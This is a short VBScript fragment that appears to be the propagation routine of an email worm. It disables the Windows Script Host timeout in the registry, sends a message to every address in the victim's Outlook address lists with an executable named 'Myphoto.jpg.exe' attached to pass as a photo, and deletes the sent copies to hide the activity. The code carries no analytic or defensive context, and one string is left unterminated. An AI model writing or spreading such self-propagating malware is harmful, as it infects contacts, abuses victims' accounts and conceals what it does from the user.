   On Error Resume Next
   dim wscr,rr
   set wscr=CreateObject("WScript.Shell")
   wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
   dim fso,dirwin,us
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set dirwin = fso.GetSpecialFolder(0)
   Set tz=CreateObject("Outlook.Application")
   If tz="Outlook" Then
   Set pj=tz.GetNameSpace("MAPI")
   For Each rb In pj.AddressLists
   If rb.AddressEntries.Count <> 0 Then
   us=rb.AddressEntries.Count
   For pg=1 To us
   Set dg=tz.CreateItem(0)
   Set sv=rb.AddressEntries(pg)
   dg.To=sv.Address
   dg.Subject=Application.UserName & ":
   dg.Body="............" & vbcrlf & ""
   dg.Attachments.Add(dirwin & "\Temporary Internet Files\Myphoto.jpg.exe")
   dg.DeleteAfterSubmit = True
   If dg.To <> "" Then
   dg.Send
   End If
   Next
   End If
   Next
   end if
